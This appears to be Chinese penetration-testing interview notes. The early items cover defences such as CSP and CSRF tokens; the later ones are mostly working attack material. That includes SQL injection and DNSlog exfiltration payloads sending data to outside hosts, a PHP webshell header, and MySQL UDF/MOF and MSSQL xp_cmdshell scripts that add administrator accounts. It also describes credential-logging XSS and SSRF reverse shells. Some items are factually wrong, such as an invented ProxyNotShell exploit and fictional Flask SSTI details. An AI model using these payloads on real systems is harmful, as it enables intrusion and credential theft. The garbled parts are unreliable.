2.  优化atomy:在存储过程编译时,数据库优化器有更多上下文信息来确定最优查询计划。它可以考虑存储过程中的所有SQL语句,选择一个全局最优的计划。而单独SQL语句执行时,优化器只根据单条语句来选择计划,效果可能不如存储过程优化。
3.  重用代码:存储过程中的SQL逻辑可以被重复调用,避免反复编写相同的查询语句。这有利于标准化和维护SQL代码。
4.  减少网络流量:客户端在调用存储过程时只需要传输存储过程名称和参数,而不需要每次都传输完整的SQL语句文本,这可以节省网络带宽,提高传输效率。
5.  安全性:可以通过赋予execute权限来控制谁可以运行某存储过程。而任意的SQL语句文本可能可以被更多用户查询和执行。存储过程也可以防止SQL注入,因为其参数作为变量传递,而不是拼接在SQL语句中。

所以,存储过程通过预编译可以实现:
(1)编译时优化SQL逻辑和查询计划;
(2)执行时直接调用优化后的可执行形式,避免重复编译解析;
(3)提高SQL执行效率;
(4)增强SQL逻辑的重用性和可维护性;
(5)减少网络通信量;
(6)加强SQL执行的安全控制。
这些都是存储过程预编译带来的重要优势。但是,存储过程也有一定限制,如难以调试、不容易与应用层绑定等。所以,存储过程需要在提高数据库性能和保证灵活性之间取得平衡。
### 19. csp是如何防御xss的
> CSP（Content Security Policy）是一种安全策略，它通过限制浏览器加载内容的来源来减少XSS攻击的风险。具体来说，CSP可以帮助网站管理员控制哪些资源可以被加载和执行，从而减少恶意脚本的影响。

1. 服务器在HTTP响应中返回CSP头,定义页面允许加载的资源域,如JavaScript、CSS、图片及其他内容。
2. 浏览器根据CSP头的策略,判断加载的资源是否来自允许的域。如果不在允许范围内,则阻止加载该资源。
3. 恶意脚本无法加载入页面,实现XSS防御。
例如,一个CSP头可以这样定义:
```http
Content-Security-Policy: default-src 'self'; img-src *; script-src 'self' cdn.example.com 
```
这个策略的意思是:
1. 页面的默认内容(如JavaScript)只允许从自身域加载
2. 图片可以从任意域加载
3. 脚本只允许从自身域和cdn.example.com加载
所以任何不在 script-src 允许范围内的外域脚本都无法在页面执行,防止了XSS攻击。

所以,CSP通过定义严格的内容安全策略,限制页面可以加载和执行的资源来源和范围,实现有效防御XSS和其他跨站脚本攻击的目的。这种白名单机制的安全策略可以最大限度减少恶意脚本注入的风险。
### 20. csrf为什么用token可以防御
> CSRF Token是在网站中生成的一段随机字符串，它被嵌入到表单中，然后提交给服务器。服务器会对该请求进行验证，检查请求中的Token是否合法，如果不合法，则拒绝请求，从而防止了CSRF攻击。

1. 服务器生成随机Token,并将其与用户会话或其他凭证绑定,并在HTML表单或URL中传递给客户端。
2. 用户在提交表单或链接时,将Token一并提交给服务器。
3. 服务器校验Token是否正确且与当前用户绑定,如果是则接受请求,否则拒绝该请求。
4. 攻击者无法伪造Token,因此无法产生被服务器接受的非法请求,实现CSRF防御。


### 21. 指纹识别的方式
> 指纹识别是指通过对目标进行一系列特征探测和分析，从而确定目标的某些特定信息或属性的过程。在网络安全领域，指纹识别主要用于识别目标的应用程序、操作系统、中间件等相关技术信息，以便进行后续的攻击或防御。
> 常见的指纹识别方式有以下几种：
> 1. HTTP Banner：通过 HTTP 响应头和页面内容进行识别，常用的工具有 WhatWeb 和 httprint。
> 2. 端口扫描：通过扫描目标的端口，检测端口是否开放，从而判断目标主机上运行的服务。常用的工具有 Nmap 和 masscan。
> 3. SSL/TLS 指纹识别：通过对 SSL/TLS 握手过程中的信息进行分析，判断目标主机所使用的 SSL/TLS 协议版本和加密套件。常用的工具有 SSLScan 和 sslyze。
> 4. Web 应用指纹识别：通过对 Web 应用程序中的 URL、表单、Cookie 等信息进行分析，判断 Web 应用程序的类型、版本和中间件等技术信息。常用的工具有 Wappalyzer 和 WebApp 指纹识别。
> 5. DNS 指纹识别：通过对目标域名的 DNS 解析结果进行分析，判断目标主机所使用的 DNS 服务器、主机名、子域名等信息。常用的工具有 DNSRecon 和 Fierce。
> 6. 基于机器学习的指纹识别：利用机器学习算法对目标进行特征分析和模式识别，从而实现精准的指纹识别。常用的工具有 BlindElephant 和 FingerPrint。


###  22. 邮件网关 spf 的绕过  
> SPF (Sender Policy Framework) 是一种邮件验证机制，用于防止邮件欺骗。SPF 允许邮件接收方检查发件人的 IP 地址是否在发件人的 DNS 记录中，以确定邮件是否来自合法的发件人。
> 在邮件网关中，SPF 的检查通常是由邮件网关代理客户端进行的。当客户端从外部邮件服务器接收到一封邮件时，邮件网关会检查邮件的来源 IP 是否在 SPF 记录中。如果该 IP 未在 SPF 记录中，则邮件网关会将其标记为可疑邮件。
> SPF 的绕过方式通常是伪造邮件的来源 IP 地址，使其在 SPF 记录中。这可以通过使用已知的可信 IP 地址来实现，或者使用某些代理服务器（如 Tor）来隐藏真实 IP 地址。
> 此外，攻击者还可以使用不存在的域名或伪造的域名来欺骗邮件网关。在这种情况下，攻击者需要伪造一个包含其控制的恶意 IP 地址的 SPF 记录，并将其添加到伪造的域名的 DNS 记录中。
> 为了防止这种情况发生，邮件管理员可以使用 DMARC (Domain-based Message Authentication, Reporting and Conformance) 记录来验证邮件的来源域名和 SPF 记录。如果 DMARC 记录中的策略不允许未通过验证的邮件，则邮件网关将拒绝该邮件。

邮件网关通常会使用以下几种方法来拦截钓鱼邮件:

1.  基于规则的过滤:设置一系列规则,如邮件中的链接、附件类型、发送者的IP地址等,来过滤可疑的邮件。这种方法容易设置,但也容易被骗过。
2.  黑名单/白名单:通过设置发送者的黑名单和白名单来过滤邮件。黑名单上的发送者发来的邮件会被拦截,白名单上的发送者发来的邮件会被放行。这种方法需要维护大量的名单,而且也可能会有误报和漏报。
3.  内容过滤:通过分析邮件内容,如主题、正文等来检测可疑邮件。例如检测邮件中是否包含钓鱼网站的URL、恶意软件的名字等。这种方法需要更高级的内容分析技术,是目前邮件网关的主要方法之一。
4.  机器学习:使用机器学习算法对大量历史邮件进行训练,建立模型来检测新的邮件是否为钓鱼邮件。这是邮件网关当前最为先进的方法,可以有效检测新的钓鱼邮件,但需要大量的数据进行训练。
5.  沙盒检测:将邮件的内容在隔离的沙盒环境中打开和运行,监控其行为来检测是否存在恶意代码。这种方法可以检测出含有恶意配件的钓鱼邮件,但成本较高,不适合大规模使用。

钓鱼者常常会使用各种方法来**绕过邮件网关的检测,**主要有以下几种:

1.  使用无害看起来的URL和附件:钓鱼邮件会使用焦点单词和无害的URL和附件来躲避内容过滤,例如使用缩短的URL或使用无害的文件名来隐藏真实的恶意网址和附件。
2.  改变邮件内容样式:通过改变邮件的字体、颜色、图片等来破坏邮件网关依靠邮件样式进行分类的能力,让恶意邮件看起来像正常邮件。
3.  使用黑名单以外的机器:通过使用不在黑名单内的机器发邮件,来避开基于IP的过滤。钓鱼者也会频繁更换使用的机器IP地址。
4.  攻击机器学习模型:构造专门的邮件来欺骗机器学习模型,让其分类为正常邮件。这需要钓鱼者对机器学习模型有一定了解,能构造出模型难以检测的邮件。
5.  使用零日漏洞:当邮件网关产品存在未公开的漏洞时,钓鱼者会利用这些“零日漏洞”来绕过检测。这需要钓鱼者具有比较高的技术实力。
6.  同时使用多种方法:在实际的钓鱼邮件中,钓鱼者通常会综合运用以上多种方法来达到最佳的绕过效果,这也使得邮件网关的检测变得更加困难。
### 23. edr绕过
> EDR通常包括防病毒、漏洞扫描、行为监测、文件完整性检查等多种功能。
> 然而，一些攻击者可能会尝试绕过EDR的防御机制，以便在受攻击的系统上执行恶意操作。以下是一些可能用于绕过EDR的技术：
> 1. 基于进程注入的技术：攻击者可能会使用进程注入技术来将恶意代码注入到受感染的进程中，以绕过EDR的检测。
> 2. 混淆：攻击者可能会使用各种混淆技术，如代码加密、字符串混淆、虚拟机等，以防止EDR检测到恶意代码。
> 3. 文件less攻击：攻击者可能会使用文件less攻击，这种攻击不需要在受攻击系统上安装任何文件，因此可以绕过EDR的检测。
> 4. 异常恢复技术：攻击者可能会使用异常恢复技术来绕过EDR。异常恢复技术是指攻击者利用系统自带的异常恢复功能，将错误的操作伪装成正常的操作，从而绕过EDR的检测。
> 
为了有效防止这些绕过EDR的技术，建议采取以下措施：
> 1. 部署EDR解决方案，及时更新EDR的规则和引擎，保持EDR系统的最新状态。
> 2. 加强权限管理，限制用户对系统的访问权限，尽量减少攻击者的入口。
> 3. 实施多层防御策略，采用防火墙、入侵检测等其他安全解决方案，以加强对受攻击系统的保护。
> 4. 增强人员的安全意识，加强对员工的安全培训，提高其识别和应对安全威胁的能力


### 24. masscan号称世界上最快的扫描器，快的原因是什么
> Masscan是一款快速的端口扫描器，它采用异步的、事件驱动的I/O模型和自己实现的TCP/IP协议栈，以及高效的端口扫描算法，使其具有很高的扫描速度。具体来说，Masscan的快速扫描原因包括以下几个方面：
> 1. 异步的、事件驱动的I/O模型：Masscan使用异步的I/O模型，减少了I/O等待时间，提高了CPU的利用率。
> 2. 自己实现的TCP/IP协议栈：Masscan使用自己实现的TCP/IP协议栈，减少了系统调用次数，提高了扫描效率。
> 3. 高效的端口扫描算法：Masscan采用高效的端口扫描算法，包括分块扫描和TCP SYN扫描等方式，提高了扫描效率。
> 4. 多线程和分布式支持：Masscan支持多线程和分布式扫描，利用多核CPU和多台机器进行扫描，进一步提高了扫描效率。
> 
综上所述，Masscan的快速扫描原因主要是由于其采用了**高效的I/O模型、自己实现的协议栈、高效的端口扫描算法以及多线程和分布式支持。**

### 25. XXE漏洞产生的原理，针对PHP和JAVA，XXE分别可以进行哪些恶意利用
> XXE（XML External Entity）漏洞是一种安全漏洞，主要是由于在解析XML数据时，未正确禁止或过滤外部实体，导致攻击者可以通过构造恶意的XML数据来读取服务器上的任意文件、执行任意命令等攻击。
> 对于PHP环境，XXE漏洞利用的基本原理是通过发送带有外部实体引用的恶意XML数据，然后读取敏感数据。例如，攻击者可以构造恶意的XML数据，在其中引用一个URL，然后将其作为HTTP POST请求的一部分发送到应用程序中。当服务器解析该请求并尝试获取外部实体时，攻击者就可以通过该URL读取文件内容，进而实现文件读取等攻击。
> 对于Java环境，XXE漏洞的利用过程也是通过构造恶意的XML数据，然后发送给应用程序解析。攻击者可以在恶意XML数据中引用一个外部实体，通过读取服务器上的文件或执行任意命令来攻击目标系统。此外，由于Java的XXE漏洞可能导致RCE（远程代码执行），攻击者可以通过构造Payload来执行操作系统命令或上传Webshell等。
> 需要注意的是，针对XXE漏洞的恶意利用并不仅限于读取敏感信息和执行任意命令。例如，在Java中，XXE漏洞还可以利用Spring Framework进行攻击，通过利用XXE漏洞读取应用程序上下文中的任意对象、创建新的用户等。
> 综上所述，XXE漏洞可能会给Web应用程序带来严重的安全风险。建议开发人员在编写代码时，对输入的XML数据进行充分过滤和验证，特别是对外部实体进行禁止或限制。同时，使用安全编程实践，如最小特权原则、输入验证和输出编码等，可以最大程度地降低XXE漏洞的风险。

### 26. ProxyNotShell
CVE-2021-27065
修补ProxyLogon漏洞的更新中,微软仅过滤了HTTP代理头中的 certain 字段,未过滤Proxy 字段。攻击者可以构造恶意的 Proxy 头,在修补过的 Exchange 服务器上触发远程代码执行。
2. 构造恶意的Proxy头。一个例子如下:
```http
Proxy: <?php $cmd=$_GET["cmd"]; system($cmd); ?> 
```
3. 发送包含恶意Proxy头的HTTP请求到Exchange服务器。例如:
```http
GET /ews/exchange.asmx HTTP/1.1
Host: target
Proxy: <?php $cmd=$_GET["cmd"]; system($cmd); ?>
```
4. 在同一个请求中添加cmd参数执行系统命令,例如:
```http
GET /ews/exchange.asmx?cmd=whoami HTTP/1.1
Host: target
Proxy: <?php $cmd=$_GET["cmd"]; system($cmd); ?>
```
5. 如果命令输出出现在HTTP响应中,则证明远程代码执行成功。此时攻击者可以执行更多命令来增加权限、植入后门等。

### 27. python的flask模版注入
是SSTI注入的一种，Jinja2模版、Django模版语言；Jinja2是Flask和Django默认的模版引擎
Flask中的模版注入漏洞可以允许攻击者在渲染模版(HTML文件)时执行恶意代码。
1. 变量渲染:在Flask模版中使用未过滤的用户输入作为变量名或者属性名,可以导致代码执行。例如:
```html
<h1>Hello {{name}}</h1>
如果用户输入的name为`__class__`,会导致代码执行。
```

2. 过滤器绕过:Flask提供了名称为`|`(管道符)的过滤器,用于过滤和转换数据。如果过滤器可以被绕过,同样会导致代码执行。例如:
```html
<h1>Hello {{ name | set_trace }} </h1>
如果用户输入的name为`__debugger__`,可以绕过set_trace过滤器执行代码。
```
3. 沙盒绕过:Flask默认启用全局沙盒(沙箱),防止模板渲染过程中执行危险代码。但是,一些方法如`__subclasses__()`和`__mro__`可以用来绕过全局沙盒。
4. Context变量覆盖:Flask提供了contex变量,如g、request等,如果用户可控输入覆盖其中context变量,同样会导致远程代码执行。
5. 自定义过滤器:自定义的过滤器如果没有正确进行输入过滤,也可能导致模版注入漏洞。
总的来说,Flask模版注入的防护主要依靠:
1) 正确过滤用户输入,特别是变量名、属性名和方法名。
2) 不在模版中使用沙盒方法如`__subclasses__()`。
3) 自定义过滤器和函数要正确进行输入过滤。
4) 使用context处理器来防止context变量被覆盖。
5) 开启Flask的沙盒保护。
### 真实IP查找方法
> 1、多地ping
> 2、泄露文件
> 3、信息收集
> 4、漏洞利用
> 5、SSL 证书
> 6、DNS解析
> 7、被动获取
> 8、流量攻击
> 9、全网扫描
> 10、长期关注
> 11、对比banner
> 12、利用老域名
> 13、favicon_hash 匹配
> 14、CloudFlare Bypass
> 15、配置不当导致绕过
> 16、APP
> 17、社工 CDN 平台
> 18、F5 LTM解码法
> 19、利用HTTP标头寻找真实原始IP
> 20、利用网站返回的内容寻找真实原始IP

### GPC是什么？GPC之后怎么绕过？
如果`magic_quotes_gpc=On`，PHP解析器就会自动为post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符（认为是php的字符）引起的污染。
**绕过方法**

1. 通过文本中转

用户输入===>gpc\addslashes()===>写入文本文件===>include===>再次写入文本文件\执行sql语句，这个和通过数据库中转大致是一样的，对于写文件的操作如果处理不当是有可能被攻击者直接拿shell的。

2. 通过编码
UTF-7(+ACc-)===>gpc\addslashes()===>mb_convert_encoding()===>UTF-8(')

0xbf27===>gpc\addslashes()===>0xbf5c27===>执行sql语句(数据库编码支持多字节)

用户输入(经过urlencode\rawurlencode\base64_encode等函数处理)===>gpc\addslashes() ===>urldecode\rawurldecode\base64_decode等函数===>执行SQL语句\include

通过二次编码绕过gpc\addslashes，比如'的URL编码二次编码%25%27。

3. 一些函数的错误处理

  假设输入的$_GET['a']为'haha，经过gpc\addslashes()会变为\'haha，再经过substr处理后又变回了'haha.

4. 字符串和数组

输入$_GET['a']为'haha，经过gpc\addslashes()会变为\'haha

5. PHP自身的一些缺陷

PHP5的GPC对$_SERVER的忽略；PHP某些版本对%00的错误转义
### 
文件上传返回403咋办
权限验证
或者nginx对请求body数据大小的控制;

### nmap的原理

1. 基于ARP，nmap -PR + ip地址；nmap向所在网段发送大量ARP请求广播，如果目标主机存活，则会收到ARP响应，若一段时间后没有收到相应，则认为主机死亡。
2. 基于ICMP，nmap -PE + ip地址；发送ICMP相应请求，如果得到目标主机回应的ICMP响应，则说明该主机处于活跃状态
3. 通过TCP SYN  三次握手；nmap -PR + ip地址，原理：nmap向所在网段发送大量ARP请求广播，如果目标主机存活，则会收到ARP响应，若一段时间后没有收到相应，则认为主机死亡。
4. 基于UDP
### sql注入数据库类型判断方法

1. 通过页面返回的报错信息，一般情况下页面报错会显示是什么数据库类型
2. 通过常见端口做初步判断
3. 通过各个数据库特有的数据表来判断
```sql
mssql
http://127.0.0.1/test.php?id=1 and (select count(*) from sysobjects)>0 and 1=1

access
http://127.0.0.1/test.php?id=1 and (select count(*) from msysobjects)>0 and 1=1
  
mysql（5.0以上）
http://127.0.0.1/test.php?id=1 and (select count(*) from information_schema.TABLES)>0 and 1=1

oracle
http://127.0.0.1/test.php?id=1 and (select count(*) from sys.user_tables)>0 and 1=1

```
4. 通过各数据库特有的连接符判断数据库类型
```sql
1、mssql数据库
http://127.0.0.1/test.php?id=1 and '1' + '1' = '11'

2、mysql数据库
http://127.0.0.1/test.php?id=1 and '1' + '1' = '11'
http://127.0.0.1/test.php?id=1 and CONCAT('1','1')='11'

3、oracle数据库
http://127.0.0.1/test.php?id=1 and '1'||'1'='11'
http://127.0.0.1/test.php?id=1 and CONCAT('1','1')='11
```
### 安全狗查杀方式
> 不是追踪变量，是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是一成不变的。


### .htaccess文件作用
> 修改配置文件，解析其他后缀，用于隐藏webshell
> <FilesMatch "xxx.jpg"> SetHandler application/x-httpd-php
.jpg文件会被解析成.php文件。




### 

### 有shell的情况下，使用xss长久控制
> 后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。
> 在登录后才可以访问的文件中插入XSS脚本。
> 或者登录成功提示加载flash脚本，远程下载文件，控制终端


### mysql写webshell的几种方式
利用条件
> root权限
> GPC关闭（能使用单引号），magic_quotes_gpc=On
> 有绝对路径（读文件可以不用，写文件必须）
> 没有配置–secure-file-priv
> 成功条件：有读写的权限，有create、insert、select的权限

方法
> union select 后写入
> lines terminated by 写入
> lines starting by 写入
> fields terminated by 写入
> COLUMNS terminated by 写入


### 注入写shell的问题

1. 写shell用什么函数？ 
   - `select '<?php phpinfo()> into outfile 'D:/shelltest.php'`
   - `dumpfile`
   - `file_put_contents`

 

2. outfile不能用了怎么办？ `select unhex('udf.dll hex code') into dumpfile 'c:/mysql/mysql server 5.1/lib/plugin/xxoo.dll';`可以UDF提权 [https://www.cnblogs.com/milantgh/p/5444398.html](https://www.cnblogs.com/milantgh/p/5444398.html)
3. dumpfile和outfile有什么不一样？outfile适合导库，在行末尾会写入新行并转义，因此不能写入二进制可执行文件。
4. 写shell的条件？ 
   - 用户权限
   - 目录读写权限
   - 防止命令执行：`disable_functions`，禁止了`disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source`，但是可以用dll扩展执行命令或者ImageMagick漏洞 [https://www.waitalone.cn/imagemagic-bypass-disable_function.html](https://www.waitalone.cn/imagemagic-bypass-disable_function.html)
   - open_basedir: 将用户可操作的文件限制在某目录下

### Mysql下Limit注入方法

此方法适用于MySQL 5.x中，在limit语句后面的注入 
在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的，那么使用**PROCEDURE**函数能否注入呢？
```plsql
mysql> SELECT field FROM table where id > 0 ORDER BY id LIMIT 1,1 PROCEDURE ANALYSE(1); 
ERROR 1386 (HY000): Can't use ORDER clause with this procedure

ANALYSE可以有两个参数：

mysql> SELECT field FROM table where id > 0 ORDER BY id LIMIT 1,1 PROCEDURE ANALYSE(1,1); 
ERROR 1386 (HY000): Can't use ORDER clause with this procedure

但是立即返回了一个错误信息： 
mysql> SELECT field from table where id > 0 order by id LIMIT 1,1 procedure analyse((select IF(MID(version(),1,1) LIKE 5, sleep(5),1)),1);
ERROR 1108 (HY000): Incorrect parameters to procedure 'analyse'


sleep函数肯定没有执行，可以攻击的方式： 
mysql> SELECT field FROM user WHERE id >0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 
ERROR 1105 (HY000): XPATH syntax error: ':5.5.41-0ubuntu0.14.04.1'


如果不支持报错注入的话，还可以基于时间注入：
SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
直接使用sleep不行，需要用BENCHMARK代替。 
```


### Sql 注入无回显，利用 DNSlog带出
```basic
1. 没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。

2. 此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。

3. Mysql 中利用 load_file() 构造payload

‘ and if((select load_file(concat(‘\\\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# 

4. Mssql 下利用 master..xp_dirtree 构造payload

DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+’.xxx.ceye.io’;EXEC(‘master..xp_dirtree”\’+@host+’\foobar$”‘);
```
### sqlmap --os-shell原理
#### mysql
**执行条件**
（1）网站必须是root权限
（2）攻击者需要知道网站的绝对路径
（3）GPC为off，php主动转义的功能关闭
**原理**
用into outfile函数将一个可以用来上传的php文件写到网站的根目录下，然后再用此文件上传了一个php马，然后执行命令，退出时删除shell。
#### sqlserver
必要条件：

- 数据库支持外连
- 数据库权限为SA权限
- 检测是否开启了xp_cmdshell，如果没有开启sqlmap就会尝试开启

Sqlserver --os-shell主要是利用xp_cmdshell扩展进行命令执行。
使用--sql-shell手动开启：
```plsql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

查看是否为SA
select IS_SRVROLEMEMBER('sysadmin')

查看是否存在xp_cmdshell扩展进程，显示1为存在。
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell';

```
### mysql 提权

1. udf提权

原理：利用了root 高权限，创建带有调用cmd的函数的udf.dll动态链接库，导出 udf.dll 文件后，我们就可以直接在命令框输入 cmd
> 要求: 
> 1.目标系统是Windows(Win2000,XP,Win2003)；
> 2.拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数 
> 3.有root账号密码 导出udf: MYSQL 5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的lib\plugin文件夹下才能创建自定义函数，可以再mysql里输入select @@basedirshow variables like ‘%plugins%’ 寻找mysql安装路径 提权:
> 使用SQL语句创建功能函数。语法：Create Function 函数名（函数名只能为下面列表中的其中之一）returns string soname ‘导出的DLL路径’；

```basic
create function cmdshell returns string soname ‘udf.dll’
select cmdshell(‘net user arsch arsch /add’);
select cmdshell(‘net localgroup administrators arsch /add’);

drop function cmdshell;
```
该目录默认是不存在的，这就需要我们使用webshell找到MYSQL的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录即可。

2.  mof提权
```basic
#pragma namespace("\\\\.\\root\\subscription")

instance of __EventFilter as $EventFilter
{
EventNamespace = "Root\\Cimv2";
Name  = "filtP2";
Query = "Select * From __InstanceModificationEvent "
"Where TargetInstance Isa \"Win32_LocalTime\" "
"And TargetInstance.Second = 5";
QueryLanguage = "WQL";
};

instance of ActiveScriptEventConsumer as $Consumer
{
Name = "consPCSV2";
ScriptingEngine = "JScript";
ScriptText =
"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user waitalone waitalone.cn /add\")";
};

instance of __FilterToConsumerBinding
{
Consumer   = $Consumer;
Filter = $EventFilter;
};
```
其中的第18行的命令，上传前请自己更改。

执行load_file及into dumpfile把文件导出到正确的位置即可。
```basic
select load file('c:/wmpub/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mov'
```
  执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后3389连接之就ok了。
```basic
（1）UDF 提权 
create function cmdshell returns string soname ’udf.dll’ 
select cmdshell(’net user iis_user 123!@#abcABC /add’); 
select cmdshell(’net localgroup administrators iis_user /add’); 
select cmdshell(’regedit /s d:web3389.reg’); 
drop function cmdshell; 
select cmdshell(’netstat -an’); 
          
（2）VBS 启动项提权 
create table a (cmd text); 
insert into a values ("set wshshell=createobject (""wscript.shell"") " ); 
insert into a values ("a=wshshell.run (""cmd.exe /c net user iis_user 123!@#abcABC/add"",0) " );
insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup administrators iis_user /add"",0) " ); 
select * from a into outfile "C:\Documents and Settings\All Users\「开始」 菜单\程序\启动\a.vbs"; 

（3）Linx MySQL BackDoor 提权 

Mysql BackDoor 是一款针对 PHP+Mysql 服务器开发的后门,该后门安装后为 Mysql增加一个可以执行系统命令的"state"函数,并且随Mysql进程启动一个基 于 Dll 的嗅探型后门,这个后门在 Windows 下拥有与 Mysql 一样的系统权限,从 而巧妙的实现了无端口,无进程,无服务的穿墙木马. 用法：将 Mysql.php 传到 PHP 服务器上,点击"自动安装 Mysql BackDoor"， 然后直接执行命令即可 

（4）MIX.DLL 提权 
1.在独立 IP 的 sqlmap 下运 
2.禁用本地缓存 net stop dns 
3.http://localhost/inject.php?user=123' and if((SELECT LOAD_FILE(CONCAT('\\',(SELECT hex(user())),'.abc.com\foobar'))),1,1)%23 http://localhost/inject.php?user=123' and if((SELECT LOADFILE(CONCAT('\\',(SELECT concat(user,'',mid(password,2,41)) from user where user='root' limit 1),'.md5crack.cn\foobar'))),1,1)%23 

https://sanwen8.cn/p/1acWt8J.html 

4.DNS 突破 
参考文章：http://www.freebuf.com/vuls/85021.html
```

### mssql提权


#### 1. 恢复xp_cmdshell
```basic
Exec sp_configure show advanced options,1;
RECONFIGURE;
EXEC sp_configure xp_cmdshell,1;RECONFIGURE; 
EXEC sp_configure show advanced options, 1;
RECONFIGURE;
EXEC sp_configure xp_cmdshell, 1;
RECONFIGURE;-- 
```
#### 2. 如果 xp_cmdshell 还是不行就再执行命令 
```basic
dbcc addextendedproc("xp_cmdshell","xplog70.dll");-- 
或;
sp_addextendedproc xp_cmdshell,@dllname=xplog70.dll
来恢复 cmdshell 
```

#### 3. 无法在库 xpweb70.dll 中找到函数 xp_cmdshell。

```basic
原因: 127(找不到指 定的程序。) 
恢复方法：查询分离器连接后, 
第一步执行:exec sp_dropextendedproc xp_cmdshell 
第二步执行:exec sp_addextendedproc xp_cmdshell,xpweb70.dll 
然后按 F5 键命令执行完毕 
```

#### 4. 终极方法,如果以上方法均不可恢复,直接添加帐户: 
```basic
查询分离器连接后, 
2000servser 系统: 
declare @shell int exec sp_oacreate wscript.shell,@shell output exec sp_oamethod @shell,run,null,c:winntsystem32cmd.exe /c net user dell huxifeng007 /add 

declare @shell int exec sp_oacreate wscript.shell,@shell output exec sp_oamethod @shell,run,null,c:winntsystem32cmd.exe /c net localgroup administrators dell /add 
sql2008 提权 低权限运行 
```


### Getshell的几种方式
![](https://cdn.nlark.com/yuque/0/2021/png/3013360/1627856179822-bc47dfb1-c979-40c0-9c10-37ca23366931.png#averageHue=%23ebe5ed&clientId=ub6d6eee3-3dce-4&from=paste&id=u1c8d34d3&originHeight=748&originWidth=1846&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=udc1172d2-22e0-465b-94a9-aad1ab24200&title=)
引用：[https://xz.aliyun.com/t/7500](https://xz.aliyun.com/t/7500)

### 冰蝎和哥斯拉实现原理


### 代码执行、文件读取、命令执行的函数有哪些
```basic
代码执行：

eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function

2）文件读取：

file_get_contents(),highlight_file(),fopen(),read file(),fread(),
fgetss(), fgets(),parse_ini_file(),show_source(),file()

3)命令执行：

system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()
```

### 特殊服务漏洞(未授权/命令执行类/漏洞)
> 443 SSL心脏滴血 
> 873 Rsync未授权 
> 5984 CouchDB http://xxx:5984/_utils/ 
> 6379 redis未授权 
> 7001,7002 WebLogic默认弱口令，反序列 
> 9200,9300 elasticsearch ElasticSearch命令执行漏洞 
> 11211 memcache未授权访问 
> 27017,27018 Mongodb未授权访问 
> 50000 SAP命令执行 
> 50070,50030 hadoop默认端口未授权访问

### redis 未授权利用
条件:
> 1、redis服务以root账户运行
2、redis无密码或弱密码进行认证
3、redis监听在0.0.0.0公网上

方法:
> 通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫
1、上传SSH公钥获得SSH登录权限
2、通过crontab反弹shell
3、slave主从模式利用

### SSRF漏洞原理是什么？利用时有哪些伪协议？

> secpulse.com/archives/65832.html


#### 漏洞原理

利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。
#### ssrf用处

1. 探测内网信息,用协议探`ftp%26ip={ip}%26port={port}`
2. 攻击内网或本地其他服务
3. 穿透防火墙
> 一、对内网扫描，获取 banner 
> 二、攻击运行在内网的应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）
> 三、利用协议读取本地文件
> 四、 云计算环境AWS Google Cloud 环境可以调用内网操作 ECS 的 API

如webligic SSRF漏洞
> 通过SSRF的gopher协议操作内网的redis，利用redis将反弹shell写入crontab定时任务，url编码，将\r字符串替换成%0d%0a

#### 漏洞处

1. 能够对外发起网络请求的地方
2. 请求远程服务器资源的地方
3. 数据库内置功能
4. 邮件系统
5. 文件处理
6. 在线处理工具

举几个例子：

1. 在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。
2. 根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。
3. 数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。
4. 邮件系统就是接收邮件服务器地址这些地方。
5. 文件就找ImageMagick，xml这些。
6. 从URL关键字中寻找，比如：source,share,link,src,imageurl,target等。

#### 绕过姿势

1. `http://example.com@127.0.0.1`
2. 利用IP地址的省略写法绕过,[::]绕过localhost
3. DNS解析 [http://127.0.0.1.xip.io/](http://127.0.0.1.xip.io/)  可以指向任意ip的域名：xip.io
4. 利用八进制IP地址绕过,利用十六进制IP地址,绕过利用十进制的IP地址绕过

#### 利用协议
> [https://www.secpulse.com/archives/70471.html](https://www.secpulse.com/archives/70471.html)

接受ua为curl的时候，支持的协议有
使用`curl -v http://xx.com/ssrf.php?url=sxxx`
```
file://
ssrf.php?url=file:///etc/password
Dict://
dict://<user-auth>@<host>:<port>/d:<word>
ssrf.php?url=dict://attacker:11111/
SFTP://
ssrf.php?url=sftp://example.com:11111/
TFTP://
